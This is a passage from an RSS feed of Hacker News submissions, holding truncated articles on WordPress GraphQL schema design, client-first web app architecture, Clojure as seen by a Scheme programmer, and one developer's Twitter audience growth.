mapped WordPress function).</p><p>Then, the expectation is always clear:</p><ul><li>field <code>User.customPosts</code> can return a list of any custom post, including posts and pages, and <code>User.posts</code> only returns posts</li><li>field <code>Root.setFeaturedImageOnCustomPost</code> can add a featured image to any custom post, that's why it's not called <code>setFeaturedImageOnPost</code></li></ul><h3 id="heading-not-grouping-tags-(and-categories)-under-a-single-type">Not grouping tags (and categories) under a single type<a href="#heading-not-grouping-tags-(and-categories)-under-a-single-type"><span> permalink</span></a></h3><p>Why is type <code>PostTag</code> (and same for <code>PostCategory</code>) called like that, instead of just <code>Tag</code>?</p><p>Because, when executing this query (where a product is a CPT), the results from field <code>tags</code> for posts and products will always be different, non-overlapping:</p><pre><code><span><span>query</span> <span>{</span></span><br><span>  posts <span>{</span></span><br><span>    tags <span>{</span></span><br><span>      id</span><br><span>      name</span><br><span>    <span>}</span></span><br><span>  <span>}</span></span><br><span>  products <span>{</span></span><br><span>    tags <span>{</span></span><br><span>      id</span><br><span>      name</span><br><span>    <span>}</span></span><br><span>  <span>}</span></span><br><span><span>}</span></span></code></pre><p>Tags added to posts will not show up when retrieving tags for products, and the other way around (unless a product also uses the <code>post_tag</code> taxonomy, but then it can also be represented with the <code>PostTag</code> type). This does not represent a big deal in WordPress, since these items can be considered different rows from the same database table. But it does matter for GraphQL, which is strongly typed.</p><p>Then, it's a good design decision to keep these entities separate, under their own types, and have tags for posts returned under the <code>PostTag</code> type and, if a custom plugin implements its own product CPT, it must use the <code>ProductTag</code> type for its tags.</p><h3 id="heading-giving-media-items-their-own-identity">Giving media items their own identity<a href="#heading-giving-media-items-their-own-identity"><span> permalink</span></a></h3><p>Media entities in WordPress are custom post types, only because it was convenient from an implementation point of view. However, the GraphQL schema can avoid this technical debt, and model media elements as a distinct entity, not as custom posts.</p><p>This implies the following decisions for the GraphQL schema:</p><ul><li>When querying field <code>customPosts</code>, it will not fetch media elements</li><li>The <code>Media</code> type does not implement the <code>IsCustomPost</code> interface, and won't be part of the <code>CustomPostUnion</code> type</li><li>The <code>Media</code> type doesn't have many fields expected from a custom post type, such as <code>excerpt</code>, <code>date</code> and <code>status</code>. Instead, it only has those fields expected from a media element:</li></ul><pre><code><span><span>type</span> <span>Media</span> <span>{</span></span><br><span>  <span>id</span><span>:</span> ID<span>!</span></span><br><span>  <span>src</span><span>:</span> String<span>!</span></span><br><span>  <span>width</span><span>:</span> Int</span><br><span>  <span>height</span><span>:</span> Int</span><br><span><span>}</span></span></code></pre><h3 id="heading-identifying-and-mapping-enums">Identifying and mapping enums<a href="#heading-identifying-and-mapping-enums"><span> permalink</span></a></h3><p>In some situations, WordPress uses fixed values from a given set. For instance, the status of a post can only be <code>"publish…</code></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/">https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/</a></em></p>]]>
            </description>
            <link>https://graphql-api.com/blog/rejuvenating-wordpress-through-graphql/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356546</guid>
            <pubDate>Fri, 05 Mar 2021 13:22:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Case for building Client-First web apps  (2020)]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26356391">thread link</a>) | @EGreg
<br/>
March 5, 2021 | https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/ | <a href="https://web.archive.org/web/*/https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p>Now that 2020 is here, let’s look at what we can expect from the next decade in software. As Web developers, our solutions can help shape the organizations we work for. The tools we build and the architectural decisions we make have a compounding effect on society at large. What are the new trends, and will they help empower or enslave people?</p>
<h2>The Old Trends</h2>
<p>The trends in the last 10-20 years have led to more and more&nbsp;<a href="https://qbix.com/blog/2017/08/20/centralization-and-open-source/">centralization of the Web</a>, consolidation of power in the hands of the largest services (Facebook, Google, Amazon, Reddit) and their extended ecosystems. Between these and the large publications, the “independent Web” has suffered a tremendous setback. Most people and organizations trust large corporations with proprietary algorithms to manage their data, identity and brand. This has led to&nbsp;<a href="https://qbix.com/blog/2019/03/08/how-qbix-platform-can-change-the-world/">massive new issues for individuals and society</a>, involving governments and corporations, and how we all relate to one another. Attempts to resolve these issues have spawned some projects to&nbsp;<a href="https://qbix.com/blog/2017/08/30/the-future-of-decentralization/">decentralize the Web</a>.</p>
<p>When the Web was born, browsers rendered HTML documents, and there was very little support for client-side programming. Whatever Javascript support was introduced over the next decade was inconsistent because of the&nbsp;<a href="https://en.wikipedia.org/wiki/Browser_wars">browser wars</a>, and led to&nbsp;<a href="http://www.jqueryvsmootools.com/">Javascript libraries</a> to bridge the gap, of which jQuery emerged as the winner. The last 10 years saw the rise of&nbsp;<a href="https://angular.io/">Angular</a> and&nbsp;<a href="https://reactjs.org/">React</a>, new versions of&nbsp;<a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5">Javascript</a> and&nbsp;<a href="https://developer.mozilla.org/en-US/docs/Web/API">HTML5 Web APIs</a>, which finally made front-end Web programming a powerful proposition on the most widely deployed platform in the world.</p>
<h2>Client-First Web Apps</h2>
<p>As Javascript was maturing, a conventional wisdom has developed among most Web developers, that you should render the HTML on the client side, and then progressively enhance it with Javascript. This was considered best practice and recommended by pretty much every authority from&nbsp;<a href="https://www.freecodecamp.org/news/what-is-progressive-enhancement-and-why-it-matters-e80c7aaf834a/">2009</a> to&nbsp;<a href="https://www.freecodecamp.org/news/what-is-progressive-enhancement-and-why-it-matters-e80c7aaf834a/">2018</a>.</p>
<p>In this decade, Web developers will turn this conventional wisdom on its head, and start to consider progressive enhancement to go the other way:</p>
<ol>
<li>First, develop static HTML, CSS and Javascript</li>
<li>Make Javascript fetch data from servers, render it on the client</li>
<li>Progressively enhance the site for older environments (Server-rendered HTML)</li>
</ol>
<p>What follows are multiple reasons for why this is the better approach going forward.&nbsp;This one shift in how we approach Web development will have profound technological and societal implications.</p>
<h2 id="distributing-software">Distributing Software</h2>
<p><strong>1. Separation of concerns.</strong> It pays to decouple the rendering of an interface from the delivery of code / markup. That way we are not tied to one type of app delivery — that of a server on the web sending our executable code. We are able to&nbsp;<a href="https://en.wikipedia.org/wiki/Sideloading">sideload apps</a>, download them from&nbsp;<a href="https://developer.apple.com/documentation/bundleresources">app stores</a>, and update specific files when they have changed. And we use one language for each task, too: JS is the code. HTML / Handlebars / etc. can be used for templates / markup. CSS is used for presentation. JSON or XML is used for data. After you have done this, if you want to pre-render HTML on a server for AJAX, you can, but will start to feel “dirty” as you’ll be coupling things unnecessarily again. Things are going this way as&nbsp;<a href="https://www.gatsbyjs.org/blog/2019-10-15-free-headless-cms/">headless CMSes</a> are making an appearance, while&nbsp;<a href="https://cordova.apache.org/">Cordova</a>,&nbsp;<a href="https://ionicframework.com/">Ionic</a> and&nbsp;<a href="https://facebook.github.io/react-native/">React Native</a> represent other ways of delivering code through app stores.</p>
<p><strong>2. Trust. </strong>You can’t trust what code is running remotely (although Signal&nbsp;<a href="https://signal.org/blog/private-contact-discovery/">has been experimenting</a> with using&nbsp;<a href="https://software.intel.com/en-us/articles/innovative-technology-for-cpu-based-attestation-and-sealing">Software Guard Extensions</a> by CPU makers, originally designed for DRM, to go the other way and ensure what code runs on a server). But even if you can, you have no guarantee some other process won’t steal or corrupt your data. The&nbsp;<a href="https://en.wikipedia.org/wiki/Trusted_computing_base">Trusted Computing Base</a> should not include arbitrary amounts of remote sites shipping code at any time. Decoupling how the code is loaded (see point #1) onto your client allows you or your user agent to verify checksums and certify that it is indeed the code you think it is. And it is that code that should be managing your data and using the personal keys on your device. Package managers and app stores will be able to distribute code that has been audited by third-party security firms, and people will be able to trust them.</p>
<p><strong>3. Decentralization of Code.</strong> As the next decade unfolds, we will find that&nbsp;code bases don’t necessarily have to live shrink-wrapped on a specific server. Rather, clients can use multiple interoperable software modules and versions and can have multiple app stores and distributors in the future helping maintain repos and package managers for end-users and organizations. We will probably see automated package management become more user friendly in the 2020s, as we already have a docker container culture, we have browser based package managers etc.</p>
<h2 id="data-ownership">Data Ownership</h2>
<p><strong>4. Decentralization of Data.</strong> This is the big one in terms of effect on society. By having web servers render your webpage, you are implicitly locking yourself and your organization into the type of model where the servers store and access the data in a private database. They have enough data to render everything, apply access control rules to manage what you can read and write, and so on. Instead, we as a society need to empower people and their client side apps, and push the logic of fetching data, caching it and assembling it to the&nbsp;<a href="https://continuations.com/post/108271329110/tedxnewyork-big-and-bot-policy-proposals">user agents</a>. We can use&nbsp;<a href="https://en.wikipedia.org/wiki/Capability-based_security">capabilities</a> /&nbsp;<a href="https://www.oauth.com/oauth2-servers/access-tokens/">access tokens</a> for data instead of a centralized site rendering HTML.&nbsp;In this way, always inverting the progressive enhancement is an&nbsp;<em>activist</em> position to change society against the abuses of power&nbsp;<a href="https://qbix.com/blog/2019/03/08/how-qbix-platform-can-change-the-world/">like the ones listed here</a>.</p>
<p><strong>5. Reliability</strong> After the 2015 ISIS attacks in Paris, countries around the world expressed solidarity with the French people. French colors were flown, but similar-sized attacks at the same time by ISIS in&nbsp;<a href="https://www.nytimes.com/2015/11/16/world/middleeast/beirut-lebanon-attacks-paris.html?smid=tw-nytimesworld&amp;smtyp=cur&amp;_r=0">Beirut</a> were totally forgotten. Facebook rolled out a feature to customize one’s profile with the French flag superimposed, but only the French flag. So we used the Qbix Platform to quickly build a small app called&nbsp;<a href="https://customizemypic.com/">customizemypic.com</a> to allow anyone to change their profile picture to a flag of their choice. The goal was to make a statement and express solidarity with people in Beirut, Baghdad and other areas hard hit by terrorism. Today, that same app is no longer able to do its core function because Facebook&nbsp;<a href="https://developers.facebook.com/blog/post/2018/04/24/new-facebook-platform-product-changes-policy-updates/">removed any way for users to give permissions to apps</a> to upload a photo on their behalf. This is what happens when you rely on third parties to announce what you can and cannot do with your own profile picture. The most extreme reliability is achieved by an&nbsp;<a href="http://offlinefirst.org/">offline-first</a> approach, which is a close cousin of the client-first trend that will grow in the 2020s.</p>
<p><strong>6. End to End Encryption.</strong> Server-side rendering perpetuates a culture where the server has all the data unencrypted. Even if the data is encrypted at rest, the served holds all the decryption keys and is one central target for hackers, government agencies, and advertisers. Rendering things client-side goes hand-in-hand with a culture of people storing their own keys on devices of their choice, and letting key management and password management be the domain of operating systems and trusted computing bases, not random websites.</p>
<h2 id="Data Delivery">Data Delivery</h2>
<p><strong>7. Bandwidth.</strong> Ever since&nbsp;<a href="https://www.youtube.com/watch?v=rm8FAHGJB3M">Steve Jobs presented WebObjects</a>, we have wanted sites to render dynamically. Well, that often involves looping through various items and rendering each one. It is extremely wasteful to send the HTML results of rendering hundreds of items to a client, when you could have just sent the data, which would then be “hydrated” into 5. templates by the client. However, I can understand pre-rendering just the items above the fold (if one could estimate this number, not knowing the size of the window on the first request).</p>
<p><strong>8. Caching Issues.</strong> Often, you have subtle and pervasive changes on every page when a person is logged in vs out. (I should remark that “logging in” into a site itself is an artifact of “centralized” thinking, but I digress.) Their avatar might be rendered in various places. New links are shown that might not be available otherwise. And new information may be shown that access control and discovery suggestions determines they can see. If you render everything on the served, there is no way to cache most of the fragments of the page, because they are changing. If you render client-side, all this comes for free.</p>
<h2 id="next-steps">Next Steps for Web Developers</h2>
<p>So by now you may be convinced that “client-first” is a good design pattern and progressive enhancement can be implemented later, by “speeding up” the first render, and by making it available to “dumb” crawlers and user agents who don’t execute Javascript in 2020. Here is how that would actually look, in actionable terms:</p>
<p><strong>9. Preloading. </strong>Okay, now that you are rendering everything client-side, you can implement a mechanism to preload data from the server. Perhaps put all the JSON in one file and send it over on the first render. Which — remember — happens only when you use a Web Browser to visit a page directly, a very specific scenario. Every other request besides that, including subsequent requests from a web browser, don’t need this preload. It’s an extra flair you can add for that specific use case. So the preloaded data comes and your Javascript will already have it and will render the HTML synchronously and quickly.</p>
<p><strong>10. Static Site Generation. </strong>The most popular static site generators today are still pretty narrow in their use-case. They help with blogs and publishing, eg&nbsp;<a href="https://jekyllrb.com/">Jekyll</a>,&nbsp;<a href="https://gohugo.io/">Hugo</a>, etc. But if you already have a dynamic site, you can sort of transform it into a static site by having a server-side script request some (dynamically specified) set of pages and render them to some related static html documents, and then begin sending 301 redirects on the dynamic pages to permanently tell browsers to go to the static pages in the future. (Because rewriting all links in your site may be infeasible). This approach runs into problems I described in point 5 — so a naive approach would only work for publicly accessible pages …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/">https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/</a></em></p>]]>
            </description>
            <link>https://qbix.com/blog/2020/01/02/the-case-for-building-client-first-web-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356391</guid>
            <pubDate>Fri, 05 Mar 2021 13:05:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clojure from a Schemer's Perspective]]>
            </title>
            <description>
<![CDATA[
Score 141 | Comments 62 (<a href="https://news.ycombinator.com/item?id=26356367">thread link</a>) | @todsacerdoti
<br/>
March 5, 2021 | https://www.more-magic.net/posts/thoughts-on-clojure.html | <a href="https://web.archive.org/web/*/https://www.more-magic.net/posts/thoughts-on-clojure.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Recently I joined <a href="https://www.bevuta.com/">bevuta IT</a>, where I am now working on a big project written in <a href="https://www.clojure.org/">Clojure</a>.  I'm very fortunate to be working in a Lisp for my day job!</p>
<p>As I've mostly worked with Scheme and have used other Lisps here and there, I would like to share my perspective on the language.</p><a href="#overall-design">
<h2 id="overall-design">Overall design</h2></a>
<p>From a first view, it is pretty clear that Clojure has been designed from scratch by (mostly) one person who is experienced with Lisps and as a language designer.  It is quite clean and has <a href="https://download.clojure.org/papers/clojure-hopl-iv-final.pdf">a clear vision</a>. Most of the standard library has a very consistent API.  It's also nice that it's a <a href="http://www.nhplace.com/kent/Papers/Technical-Issues.html">Lisp-1</a>, which obviously appeals to me as a Schemer.</p>
<p>My favourite aspect of the language is that everything is designed with a functional-first mindset.  This means I can program in the same functional style as I tend to do in Scheme.  Actually, it's even more functional, because for example its maps (what would be hash tables in Scheme) are much less clunky to deal with.  In Scheme, SRFI-69 hash tables are quite imperative, with <tt>hash-table-set!</tt> and <tt>hash-table-update!</tt> being the ways to insert new entries, which of course mutate the existing object.  Similarly, vectors can easily be extended (on either end!) functionally.</p>
<p>The underlying design of Clojure's data structures must be different. It needs to efficiently support functional updates; you don't want to fully copy a hash table or vector whenever you add a new entry. I am not sure how efficient everything is, because the system I'm working on isn't in production yet.  A quick look <a href="https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/PersistentArrayMap.java">at the code</a> implies that various data structures are used under the hood for what looks like one data structure in the language.  That's a lot of complexity!  I'm not sure that's a tradeoff I'd be happy to make.  It makes it harder to reason about performance.  You might just be using a completely different underlying data structure than expected, depending on which operations you've performed.</p><a href="#non-lispiness">
<h2 id="non-lispiness">(non) Lispiness</h2></a>
<p>To a seasoned Lisp or Scheme programmer, Clojure can appear positively <i>bizarre</i>.  For example, while there is a <tt>cons</tt> function, there are no cons cells, and <tt>car</tt> and <tt>cdr</tt> don't exist.  Instead, it has <tt>first</tt> and <tt>rest</tt>, which are definitely saner names for a language designed from scratch.  It has "persistent lists", which are immutable lists, but in most day to day programming you will not even be <b>using</b> lists, as weird as that sounds!</p><a href="#symbols-and-keywords">
<h3 id="symbols-and-keywords">Symbols and keywords</h3></a>
<p>One thing that really surprised me is that symbols are not interned. This means that two symbols which are constructed on the fly, or when read from the same REPL, are not identical (as in <tt>eq</tt> or <tt>eq?</tt>) to one another:</p>
<pre><tt>user&gt; <span>(<span>= 'foo 'foo</span>)</span>
true
user&gt; <span>(<span>identical? 'foo 'foo</span>)</span>
false</tt></pre>
<p>Keywords seem to fulfil most "symbolic programming" use cases.  For example, they're almost always used as "keys" in maps or when specifying options for functions.  Keywords <i>are</i> interned:</p>
<pre><tt>user&gt; <span>(<span>= <span>:foo</span> <span>:foo</span></span>)</span>
true
user&gt; <span>(<span>identical? <span>:foo</span> <span>:foo</span></span>)</span>
true</tt></pre>
<p>Code is still (mostly) expressed as lists of symbols, though.  When you're writing macros you'll deal with them a lot.  But in "regular" code you will deal more with keywords, maps and vectors than lists and symbols.</p><a href="#numeric-tower">
<h3 id="numeric-tower">Numeric tower</h3></a>
<p>A favorite gotcha of mine is that integers <a href="https://clojure.org/reference/data_structures#Numbers">are not automatically promoted to bignums</a> like in most Lisps that support bignums.  If you need bignums, you have to use special-purpose operators like <tt>+'</tt> and <tt>-'</tt>:</p>
<pre><tt>user&gt; <span>(<span>* <span>(<span>bit-shift-left 1 62</span>)</span> 2</span>)</span>
Execution error <span>(<span>ArithmeticException</span>)</span> at user/eval51159 <span>(<span>REPL:263</span>)</span>.
integer overflow
user&gt; <span>(<span>*' <span>(<span>bit-shift-left 1 62</span>)</span> 2</span>)</span>
9223372036854775808N

user&gt; <span>(<span>* <span>(<span>bit-shift-left 1 62</span>)</span> 2N</span>)</span> 9223372036854775808N
user&gt; <span>(<span>* 1N 1</span>)</span> 1N</tt></pre>
<p>This could lead to better performance at the cost of more headaches when dealing with the accidental large numbers in code that was not prepared for them.</p>
<p>What about rationals, you ask?  Well, those are just treated as "the unusual, slow case".  So even though they <i>do</i> normalize to regular integers when simplifying, operations on those always return BigInts:</p>
<pre><tt>user&gt; <span>(<span>+ 1/2 1/4</span>)</span>
3/4
user&gt; <span>(<span>+ 1/2 1/2</span>)</span>
1N
user&gt; <span>(<span>/ 1 2</span>)</span> 1/2
user&gt; <span>(<span>/ 4 2</span>)</span> 2</tt></pre>
<p>The sad part is, bitwise operators do not support bignums, <i>at all</i>:</p>
<pre><tt>user&gt; <span>(<span>bit-shift-right 9223372036854775808N 62</span>)</span>
Execution error <span>(<span>IllegalArgumentException</span>)</span> at user/eval51167 <span>(<span>REPL:273</span>)</span>.
bit operation not supported for: class clojure.lang.BigInt
user&gt; <span>(<span>bit-shift-right' 9223372036854775808N 62</span>)</span> Syntax error compiling at <span>(<span>*cider-repl test:localhost:46543<span>(<span>clj</span>)</span>*:276:7</span>)</span>.
Unable to resolve symbol: bit-shift-right' in this context</tt></pre>
<p>There's one benefit to all of this: if you know the types of something going into numeric operators, you will typically know the type that comes out, because there is no automatic coercion.  Like I mentioned, this may provide a performance benefit, but it also simplifies reasoning about types.  Unfortunately, this does not work as well as you would hope because division may change the type, depending on whether the result divides cleanly or not.</p><a href="#syntax">
<h3 id="syntax">Syntax</h3></a>
<p>For many Lispers, this is the elephant in the room.  Clojure certainly qualifies as a Lisp, but it is much heavier on syntax than most other Lisps.  Let's look at a small contrived example:</p>
<pre><tt><span>(<span><i><span>let</span></i> [foo-value <span>(<span>+ 1 2</span>)</span>
      bar-value <span>(<span>* 3 4</span>)</span>]
  {<span>:foo</span> foo-value
   <span>:bar</span> bar-value}</span>)</span></tt></pre>
<p>This is a <tt>let</tt> just like in Common Lisp or Scheme.  The bindings are put inside square brackets, which is literal syntax for <i>vectors</i>.  Inside this vector, key-value pairs are interleaved, like in a Common Lisp <a href="http://www.lispworks.com/documentation/lw50/CLHS/Body/26_glo_p.htm#property_list">property list</a>.</p>
<p>The lack of extra sets of "grouping" parentheses is a bit jarring at first, but you get used to it rather quickly.  I still mess up occasionally when I accidentally get an odd number of entries in a binding vector.  Now, the <tt>{:foo foo-value :bar bar-value</tt>} syntax is a <i>map</i>, which acts like a hash table (more on that below).</p>
<p>There doesn't seem to be a good rationale about why vectors are used instead of regular lists, though.  What I <i>do</i> really like is that all the binding forms (even function signatures!) support <a href="https://clojure.org/guides/destructuring">destructuring</a>.  The syntax for destructuring maps is a bit ugly, but having it available is super convenient.</p>
<p>What I regard as a design mistake is the fact that Clojure allows for optional commas in lists and function calls.  Commas are just whitespace to the reader.  For example:</p>
<pre><tt><span>(<span>= [1, 2, 3, 4] [1 2 3 4]</span>)</span> =&gt; true
<span>(<span>= '<span>(<span>1, 2, 3, 4</span>)</span> '<span>(<span>1 2 3 4</span>)</span></span>)</span> =&gt; true
<span>(<span>= {<span>:foo</span> 1, <span>:bar</span> 2, <span>:qux</span> 3} {<span>:foo</span> 1 <span>:bar</span> 2 <span>:qux</span> 3}</span>)</span> =&gt; true
<span>(<span>= <span>(<span>foo 1, 2, 3, 4</span>)</span> <span>(<span>foo 1 2 3 4</span>)</span></span>)</span> =&gt; true
<span>(<span>= [,,,,,,1,,,2,3,4,,,,,,] [1 2 3 4]</span>)</span> =&gt; true</tt></pre>
<p>Maybe this is to make up for removing the extra grouping parentheses in <tt>let</tt>, <tt>cond</tt> and map literal syntax?  With commas you can add back some clarity about which items belong together.  Rarely anybody uses commas in real code, though.  And since it's optional it doesn't make much sense.</p>
<p>This has an annoying ripple effect on quasiquotation.  Due to this decision, a different character has to be used for <tt>unquote</tt>, because the comma was already taken:</p>
<pre><tt>`<span>(<span>1 2 ~<span>(<span>+ 1 2</span>)</span></span>)</span> =&gt; <span>(<span>1 2 3</span>)</span>
`<span>(<span>1 2 ~@<span>(<span>list 3 4</span>)</span></span>)</span> =&gt; <span>(<span>1 2 3 4</span>)</span></tt></pre>
<p>This might seem like a small issue, but it is an unnecessary and stupid distraction.</p><a href="#minimalism">
<h2 id="minimalism">Minimalism</h2></a>
<p>One of the main reasons I enjoy Scheme so much is its goal of minimalism.  This is achieved through elegant building blocks.  This is embodied by the <a href="https://schemers.org/Documents/Standards/R5RS/HTML/r5rs-Z-H-3.html#%_chap_Temp_3">Prime Clingerism</a>:</p>
<pre><tt>  Programming languages should be designed not by piling feature on
  top of feature, but by removing the weaknesses and restrictions
  that make additional features appear necessary.</tt></pre>
<p>Let's check the size of the <tt>clojure.core</tt> library.  It clocks in at 640 identifiers (v1.10.1), which is a lot more than R5RS Scheme's 218 identifiers.  It's not an entirely fair comparison as Scheme without SRFI-1 or SRFI-43 or an FFI has much less functionality as well. Therefore, I think Clojure's core library is fairly small but not exactly an exercise in minimalism.</p>
<p>Clojure reduces its API size considerably by having a "<a href="https://clojure.org/reference/sequences">sequence</a> abstraction". This is similar to Common Lisp's sequences: you can call <tt>map</tt>, <tt>filter</tt> or <tt>length</tt> on any sequence-type object: lists, vectors, strings and even maps (which are treated as key/value pairs). However, it is less hacky than in Common Lisp because for example with <tt>map</tt> you don't need to specify which kind of sequence you want to get back.  I get the impression that in Common Lisp this abstraction is not very prominent or used often but in Clojure <i>everything</i> uses sequences.  What I also liked is that sequences can be <i>lazy</i>, which removes the need for special operators as well.</p>
<p>If you compare this to Scheme, you have special-purpose procedures for every concrete type: <tt>length</tt>, <tt>vector-length</tt>, <tt>string-length</tt> etc.  And there's no <tt>vector-map</tt> in the standard, so you need <a href="https://srfi.schemers.org/srfi-43/srfi-43.html#vector-map"><tt>vector-map</tt> from SRFI 43</a>.  Lazy lists are a <a href="https://srfi.schemers.org/srfi-41/srfi-41.html">separate type</a> with its own set of specialized operators.  And so on and so forth.  Using concrete types everywhere provides for less abstract and confusing code and the performance characteristics of an algorithm tend to be clearer, but it also leads to a massive growth in library size.</p>
<p>After a while I really started noticing mistakes that make additional features appear necessary: for example, there's a special macro called <tt>loop</tt> to make tail recursive calls.  This uses a keyword <tt>recur</tt> to call back into the loop.  In Scheme, you would do that with a named <tt>let</tt> where you can choose your own identifier to recur.  It's also not possible to nest such Clojure loops, because the identifier is hardcoded.  So, this called for adding <a href="https://archive.clojure.org/design-wiki/display/design/Named%2Bloops%2Bwith%2Brecur-to.html">another feature</a>, which is currently in proposal.  Speaking of <tt>recur</tt>, it is also used for tail recursive self-calls.  It relies on the programmer rather than the compiler to mark calls as tail recursive. I find this a bit of a cop-out, especially in a language that is so heavily functional.  Especially since this doesn't work for mutually tail-recursive functions.  The <a href="https://www.windley.com/archives/2008/11/tail_optimized_mutual_recursion_in_clojure.shtml">official way to do those</a> is even more of a crutch.</p>
<p>I find the special syntax for one-off lambdas <tt>#(foo %)</tt> just as misguided as <a href="https://srfi.schemers.org/srfi-26/srfi-26.html">SRFI 26</a> (<tt>cut</tt> and <tt>cute</tt>).  You often end up needing to tweak the code in such a way that you have …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.more-magic.net/posts/thoughts-on-clojure.html">https://www.more-magic.net/posts/thoughts-on-clojure.html</a></em></p>]]>
            </description>
            <link>https://www.more-magic.net/posts/thoughts-on-clojure.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356367</guid>
            <pubDate>Fri, 05 Mar 2021 13:01:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Randall Kanna 12X her Twitter following to 35k (Their Timeline #6)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26356122">thread link</a>) | @pohjie
<br/>
March 5, 2021 | https://theirtimeline.com/randall-kanna-1/ | <a href="https://web.archive.org/web/*/https://theirtimeline.com/randall-kanna-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
                <p>Randall Kanna <a href="https://www.indiehackers.com/post/i-grew-my-email-list-to-6000-and-twitter-following-from-300-to-35k-in-a-year-ama-37b1472fed?commentId=-MUX-KDn-CzzjI9WGv1W">recently posted an AMA on Indie Hackers</a> on how she grew her Twitter following from 300 in 2019 to 35k in 2020. As we are unable to extract the actual number of followers in each month, this issue will take a slightly different approach. We shall examine her tweets in the context of Daniel Vassallo's <a href="https://gumroad.com/dvassallo#PBkrO">Everyone can Build a Twitter Audience</a> course, and extract the key tweets that had the greatest engagement. Along the way, we will also see the projects Randall took on as her Twitter following grew. Let's dive right in.</p><p>🗓 December 16 2019: Establishing credibility. Being a published author under the O'Reilly brand definitely increased her credibility. However, this is not something you can get to in a single day, or even in 3 months. Randall has been a software engineer for the past 4 years before releasing her book.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">One of my biggest life goals was to be a published author before 30. I never thought I could do it. And now my first book is available on sale right in time for the holidays! <a href="https://t.co/QPVYu13JI0">https://t.co/QPVYu13JI0</a> <a href="https://t.co/xqF4bWLS58">pic.twitter.com/xqF4bWLS58</a></p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1206390773589008385?ref_src=twsrc%5Etfw">December 16, 2019</a></blockquote>

</figure><p>While you may not have the expertise to be the subject matter expert on a topic, one immediate step you can take is to identify skills you wish to develop, then learn in public. This is similar to <a href="https://www.scotthyoung.com/blog/myprojects/mit-challenge-2/">Scott Young's MIT Challenge</a>, which greatly raised his profile and made him an expert in the field of ultralearning projects.</p><p>Tweet engagement: 458 likes, 49 comments.</p><p>🗓 January 18 2020: It is interesting to note that Randall did not start any new thread at all in January. Instead, she spent her time replying to tweets and adding value to other people's audience. This tweet resonated with me- there's actionable advice in the tweet on a very specific domain. It's no surprise that this has the highest engagement among all of her replies in January.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Turn up the volume a LOT and take notes when you hear something you like. I used to hate audiobooks as I also read faster but it really helps you build focus long term. I can finish 3x what I used to read by combining print &amp; audio and my focus has improved greatly.</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1218214556897398785?ref_src=twsrc%5Etfw">January 17, 2020</a></blockquote>

</figure><p>Tweet engagement: 7 likes, 1 comment</p><p>🗓 February 19 2020: Providing differentiated value to your audience. We have all seen way too many 'so you want to learn to code' guides. But what I love about the copy is the phrasing 'with low risk to your financial future and time'. That is understanding her audience and the demand among adults who want to learn programming but are unable to afford the time needed by universities' modules.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Has anyone ever asked you how they can get into engineering and where they can start? Even 'if' they should? So many people reached out to me that I finally created a free guide. Share it with someone you know that's considering if coding is for them.<a href="https://t.co/UTm3bCpKh6">https://t.co/UTm3bCpKh6</a> <a href="https://t.co/wl4pCS9dfz">pic.twitter.com/wl4pCS9dfz</a></p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1229870377494437888?ref_src=twsrc%5Etfw">February 18, 2020</a></blockquote>

</figure><p>If you feel that the market you wish to target is already too saturated, a good way to approach it is to think about a very specific subset of your target audience that has different limitations, and work towards helping that subset.</p><p>Tweet engagement: 100 likes, 29 comments.</p><p>🗓 March 10 2020: Timely advice. Randall posted this thread while the pandemic was hitting the United States and many workplaces had to allow their employees to work remotely. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">As (almost) everyone in tech offices is officially going remote in San Francisco, here are a few tips I’ve learned as a remote dev!</p>— Randall Kanna (@RandallKanna) <a href="https://twitter.com/RandallKanna/status/1237207920955158528?ref_src=twsrc%5Etfw">March 10, 2020</a></blockquote>

